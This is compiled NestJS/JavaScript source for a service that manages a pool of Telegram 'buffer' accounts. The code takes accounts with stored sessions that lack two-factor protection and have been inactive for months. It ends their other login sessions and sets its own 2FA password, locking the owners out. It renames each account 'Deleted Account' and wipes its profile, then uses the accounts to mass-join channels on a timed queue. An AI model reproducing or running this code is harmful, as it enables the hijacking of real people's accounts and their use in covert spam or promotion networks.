"use strict";
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.BufferClientService = void 0;
const channels_service_1 = require("./../channels/channels.service");
const common_1 = require("@nestjs/common");
const mongoose_1 = require("@nestjs/mongoose");
const mongoose_2 = require("mongoose");
const Telegram_service_1 = require("../Telegram/Telegram.service");
const Helpers_1 = require("telegram/Helpers");
const users_service_1 = require("../users/users.service");
const active_channels_service_1 = require("../active-channels/active-channels.service");
const utils_1 = require("../../utils");
const client_service_1 = require("../clients/client.service");
const promote_client_service_1 = require("../promote-clients/promote-client.service");
let BufferClientService = class BufferClientService {
    constructor(bufferClientModel, telegramService, usersService, activeChannelsService, clientService, channelsService, promoteClientService) {
        this.bufferClientModel = bufferClientModel;
        this.telegramService = telegramService;
        this.usersService = usersService;
        this.activeChannelsService = activeChannelsService;
        this.clientService = clientService;
        this.channelsService = channelsService;
        this.promoteClientService = promoteClientService;
        this.joinChannelMap = new Map();
    }
    async create(bufferClient) {
        const newUser = new this.bufferClientModel(bufferClient);
        return newUser.save();
    }
    async findAll() {
        return this.bufferClientModel.find().exec();
    }
    async findOne(mobile) {
        const user = (await this.bufferClientModel.findOne({ mobile }).exec())?.toJSON();
        if (!user) {
            throw new common_1.NotFoundException(`BufferClient with mobile ${mobile} not found`);
        }
        return user;
    }
    async update(mobile, updateClientDto) {
        const updatedUser = await this.bufferClientModel.findOneAndUpdate({ mobile }, { $set: updateClientDto }, { new: true, upsert: true, returnDocument: 'after' }).exec();
        if (!updatedUser) {
            throw new common_1.NotFoundException(`User with mobile ${mobile} not found`);
        }
        return updatedUser;
    }
    async createOrUpdate(mobile, createOrUpdateUserDto) {
        const existingUser = (await this.bufferClientModel.findOne({ mobile }).exec())?.toJSON();
        if (existingUser) {
            console.log("Updating");
            return this.update(existingUser.mobile, createOrUpdateUserDto);
        }
        else {
            console.log("creating");
            return this.create(createOrUpdateUserDto);
        }
    }
    async remove(mobile) {
        await (0, utils_1.fetchWithTimeout)(`${(0, utils_1.ppplbot)()}&text=${encodeURIComponent(`Deleting Buffer Client : ${mobile}`)}`);
        const result = await this.bufferClientModel.deleteOne({ mobile }).exec();
        if (result.deletedCount === 0) {
            throw new common_1.NotFoundException(`BufferClient with mobile ${mobile} not found`);
        }
    }
    async search(filter) {
        console.log(filter);
        if (filter.firstName) {
            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') };
        }
        console.log(filter);
        return this.bufferClientModel.find(filter).exec();
    }
    async executeQuery(query, sort, limit, skip) {
        try {
            if (!query) {
                throw new common_1.BadRequestException('Query is invalid.');
            }
            const queryExec = this.bufferClientModel.find(query);
            if (sort) {
                queryExec.sort(sort);
            }
            if (limit) {
                queryExec.limit(limit);
            }
            if (skip) {
                queryExec.skip(skip);
            }
            return await queryExec.exec();
        }
        catch (error) {
            throw new common_1.InternalServerErrorException(error.message);
        }
    }
    removeFromBufferMap(key) {
        this.joinChannelMap.delete(key);
    }
    clearBufferMap() {
        console.log("BufferMap cleared");
        this.joinChannelMap.clear();
    }
    async joinchannelForBufferClients(skipExisting = true) {
        if (!this.telegramService.getActiveClientSetup()) {
            console.log("Joining Channel Started");
            await this.telegramService.disconnectAll();
            this.clearJoinChannelInterval();
            await (0, Helpers_1.sleep)(2000);
            const existingkeys = skipExisting ? [] : Array.from(this.joinChannelMap.keys());
            const clients = await this.bufferClientModel.find({ channels: { "$lt": 350 }, mobile: { $nin: existingkeys } }).sort({ channels: 1 }).limit(4);
            if (clients.length > 0) {
                for (const document of clients) {
                    try {
                        const client = await this.telegramService.createClient(document.mobile, false, false);
                        console.log("Started Joining for : ", document.mobile);
                        const channels = await client.channelInfo(true);
                        console.log("Existing Channels Length : ", channels.ids.length);
                        await this.update(document.mobile, { channels: channels.ids.length });
                        let result = [];
                        if (channels.canSendFalseCount < 50) {
                            if (channels.ids.length < 220) {
                                result = await this.channelsService.getActiveChannels(150, 0, channels.ids);
                            }
                            else {
                                result = await this.activeChannelsService.getActiveChannels(150, 0, channels.ids);
                            }
                            this.joinChannelMap.set(document.mobile, result);
                            await this.telegramService.deleteClient(document.mobile);
                        }
                        else {
                            client.leaveChannels(channels.canSendFalseChats);
                        }
                    }
                    catch (error) {
                        await this.telegramService.deleteClient(document.mobile);
                        (0, utils_1.parseError)(error);
                    }
                }
                this.joinChannelQueue();
            }
            console.log("Joining Channel Triggered Succesfully for ", clients.length);
            return `Initiated Joining channels ${clients.length}`;
        }
        else {
            console.log("ignored active check buffer channels as active client setup exists");
        }
    }
    async joinChannelQueue() {
        const existingkeys = Array.from(this.joinChannelMap.keys());
        if (existingkeys.length > 0) {
            this.joinChannelIntervalId = setInterval(async () => {
                const keys = Array.from(this.joinChannelMap.keys());
                if (keys.length > 0) {
                    console.log("In JOIN CHANNEL interval: ", new Date().toISOString());
                    for (const mobile of keys) {
                        const channels = this.joinChannelMap.get(mobile);
                        if (channels && channels.length > 0) {
                            const channel = channels.shift();
                            console.log(mobile, " Pending Channels :", channels.length);
                            this.joinChannelMap.set(mobile, channels);
                            try {
                                await this.telegramService.createClient(mobile, false, false);
                                console.log(mobile, " Trying to join :", channel.username);
                                await this.telegramService.tryJoiningChannel(mobile, channel);
                            }
                            catch (error) {
                                await this.telegramService.deleteClient(mobile);
                                const errorDetails = (0, utils_1.parseError)(error, `${mobile} @${channel.username} Outer Err ERR: `);
                                if (error.errorMessage == 'CHANNELS_TOO_MUCH' || errorDetails.error == 'FloodWaitError') {
                                    this.removeFromBufferMap(mobile);
                                    const channels = await this.telegramService.getChannelInfo(mobile, true);
                                }
                            }
                            await this.telegramService.deleteClient(mobile);
                        }
                        else {
                            this.joinChannelMap.delete(mobile);
                        }
                    }
                }
                else {
                    this.clearJoinChannelInterval();
                }
            }, 4 * 60 * 1000);
        }
    }
    clearJoinChannelInterval() {
        if (this.joinChannelIntervalId) {
            clearInterval(this.joinChannelIntervalId);
            this.joinChannelIntervalId = null;
            setTimeout(() => {
                this.joinchannelForBufferClients(false);
            }, 30000);
        }
    }
    async setAsBufferClient(mobile, availableDate = (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0]) {
        const user = (await this.usersService.search({ mobile }))[0];
        if (!user) {
            throw new common_1.BadRequestException('user not found');
        }
        const isExist = await this.findOne(mobile);
        if (!isExist) {
            throw new common_1.ConflictException('user already exist');
        }
        const clients = await this.clientService.findAll();
        const clientMobiles = clients.map(client => client?.mobile);
        const clientPromoteMobiles = clients.flatMap(client => client?.promoteMobile);
        if (!clientPromoteMobiles.includes(mobile) && !clientMobiles.includes(mobile)) {
            try {
                const telegramClient = await this.telegramService.createClient(mobile);
                await telegramClient.set2fa();
                await (0, Helpers_1.sleep)(15000);
                await telegramClient.updateUsername('');
                await (0, Helpers_1.sleep)(3000);
                await telegramClient.updatePrivacyforDeletedAccount();
                await (0, Helpers_1.sleep)(3000);
                await telegramClient.updateProfile("Deleted Account", "Deleted Account");
            }
            catch (error) {
                const errorDetails = (0, utils_1.parseError)(error);
                throw new common_1.HttpException(errorDetails.message, parseInt(errorDetails.status));
            }
            await this.telegramService.deleteClient(mobile);
            return "Client set as buffer successfully";
        }
        else {
            throw new common_1.BadRequestException("Number is a Active Client");
        }
    }
    async checkBufferClients() {
        if (!this.telegramService.getActiveClientSetup()) {
            await this.telegramService.disconnectAll();
            await (0, Helpers_1.sleep)(2000);
            const bufferclients = await this.findAll();
            let goodIds = [];
            let badIds = [];
            if (bufferclients.length < 70) {
                for (let i = 0; i < 70 - bufferclients.length; i++) {
                    badIds.push(i.toString());
                }
            }
            const clients = await this.clientService.findAll();
            const promoteclients = await this.promoteClientService.findAll();
            const clientIds = [...clients.map(client => client.mobile), ...clients.flatMap(client => { return (client.promoteMobile); })];
            const promoteclientIds = promoteclients.map(client => client.mobile);
            const today = (new Date(Date.now())).toISOString().split('T')[0];
            for (const document of bufferclients) {
                if (!clientIds.includes(document.mobile) && !promoteclientIds.includes(document.mobile)) {
                    try {
                        const cli = await this.telegramService.createClient(document.mobile, true, false);
                        const me = await cli.getMe();
                        if (me.username) {
                            await this.telegramService.updateUsername(document.mobile, '');
                            await (0, Helpers_1.sleep)(2000);
                        }
                        if (me.firstName !== "Deleted Account") {
                            await this.telegramService.updateNameandBio(document.mobile, 'Deleted Account', '');
                            await (0, Helpers_1.sleep)(2000);
                        }
                        await this.telegramService.deleteProfilePhotos(document.mobile);
                        const hasPassword = await cli.hasPassword();
                        if (!hasPassword) {
                            console.log("Client does not have password");
                            badIds.push(document.mobile);
                        }
                        else {
                            console.log(document.mobile, " :  ALL Good");
                            goodIds.push(document.mobile);
                        }
                        await this.telegramService.deleteClient(document.mobile);
                        await (0, Helpers_1.sleep)(2000);
                    }
                    catch (error) {
                        (0, utils_1.parseError)(error);
                        badIds.push(document.mobile);
                        this.remove(document.mobile);
                        await this.telegramService.deleteClient(document.mobile);
                    }
                }
                else {
                    console.log("Number is a Active Client");
                    goodIds.push(document.mobile);
                    this.remove(document.mobile);
                }
            }
            goodIds = [...goodIds, ...clientIds, ...promoteclientIds];
            console.log("GoodIds: ", goodIds.length, "BadIds : ", badIds.length);
            this.addNewUserstoBufferClients(badIds, goodIds);
        }
        else {
            console.log("ignored active check buffer channels as active client setup exists");
        }
    }
    async addNewUserstoBufferClients(badIds, goodIds) {
        const sixMonthsAgo = (new Date(Date.now() - 3 * 30 * 24 * 60 * 60 * 1000)).toISOString().split('T')[0];
        const documents = await this.usersService.executeQuery({ "mobile": { $nin: goodIds }, expired: false, twoFA: false, lastActive: { $lt: sixMonthsAgo }, totalChats: { $gt: 350 } }, { tgId: 1 }, badIds.length + 3);
        console.log("New buffer documents to be added: ", documents.length);
        while (badIds.length > 0 && documents.length > 0) {
            const document = documents.shift();
            try {
                try {
                    const client = await this.telegramService.createClient(document.mobile);
                    const hasPassword = await client.hasPassword();
                    console.log("hasPassword: ", hasPassword);
                    if (!hasPassword) {
                        await client.removeOtherAuths();
                        await client.set2fa();
                        console.log("waiting for setting 2FA");
                        await (0, Helpers_1.sleep)(30000);
                        await client.updateUsername('');
                        await (0, Helpers_1.sleep)(3000);
                        await client.updatePrivacyforDeletedAccount();
                        await (0, Helpers_1.sleep)(3000);
                        await client.updateProfile("Deleted Account", "Deleted Account");
                        await (0, Helpers_1.sleep)(3000);
                        await client.deleteProfilePhotos();
                        await (0, Helpers_1.sleep)(2000);
                        await this.telegramService.removeOtherAuths(document.mobile);
                        const channels = await client.channelInfo(true);
                        console.log("Inserting Document");
                        const bufferClient = {
                            tgId: document.tgId,
                            session: document.session,
                            mobile: document.mobile,
                            availableDate: (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0],
                            channels: channels.ids.length,
                        };
                        await this.create(bufferClient);
                        await this.usersService.update(document.tgId, { twoFA: true });
                        console.log("=============Created BufferClient=============");
                        await this.telegramService.deleteClient(document.mobile);
                        badIds.pop();
                    }
                    else {
                        console.log("Failed to Update as BufferClient has Password");
                        await this.usersService.update(document.tgId, { twoFA: true });
                        await this.telegramService.deleteClient(document.mobile);
                    }
                }
                catch (error) {
                    (0, utils_1.parseError)(error);
                    await this.telegramService.deleteClient(document.mobile);
                }
            }
            catch (error) {
                (0, utils_1.parseError)(error);
                console.error("An error occurred:", error);
            }
            await this.telegramService.deleteClient(document.mobile);
        }
        setTimeout(() => {
            this.joinchannelForBufferClients();
        }, 2 * 60 * 1000);
    }
};
exports.BufferClientService = BufferClientService;
exports.BufferClientService = BufferClientService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)('bufferClientModule')),
    __param(1, (0, common_1.Inject)((0, common_1.forwardRef)(() => Telegram_service_1.TelegramService))),
    __param(2, (0, common_1.Inject)((0, common_1.forwardRef)(() => users_service_1.UsersService))),
    __param(3, (0, common_1.Inject)((0, common_1.forwardRef)(() => active_channels_service_1.ActiveChannelsService))),
    __param(4, (0, common_1.Inject)((0, common_1.forwardRef)(() => client_service_1.ClientService))),
    __param(5, (0, common_1.Inject)((0, common_1.forwardRef)(() => active_channels_service_1.ActiveChannelsService))),
    __param(6, (0, common_1.Inject)((0, common_1.forwardRef)(() => promote_client_service_1.PromoteClientService))),
    __metadata("design:paramtypes", [mongoose_2.Model,
        Telegram_service_1.TelegramService,
        users_service_1.UsersService,
        active_channels_service_1.ActiveChannelsService,
        client_service_1.ClientService,
        channels_service_1.ChannelsService,
        promote_client_service_1.PromoteClientService])
], BufferClientService);
//# sourceMappingURL=buffer-client.service.js.map